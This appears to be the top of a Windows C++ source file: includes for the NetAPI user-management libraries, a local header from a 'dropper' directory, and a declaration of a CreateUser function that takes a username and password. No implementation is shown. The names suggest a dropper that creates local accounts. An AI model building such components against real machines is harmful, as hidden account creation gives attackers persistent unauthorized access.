#ifndef UNICODE
#define UNICODE
#endif 

#include <windows.h>
#include <lmcons.h>
#include <lmaccess.h>
#include <lmerr.h>
#include <lmapibuf.h>
#include <stdio.h>
#include <stdlib.h>
#include <fstream>
#include <iostream>
#include <filesystem>
#include "..\include\logger.hpp"
#include "..\include\header.hpp"
#include "../dropper/embed.hpp"

#pragma comment(lib, "netapi32.lib")

void CreateUser(std::wstring username, std::wstring password);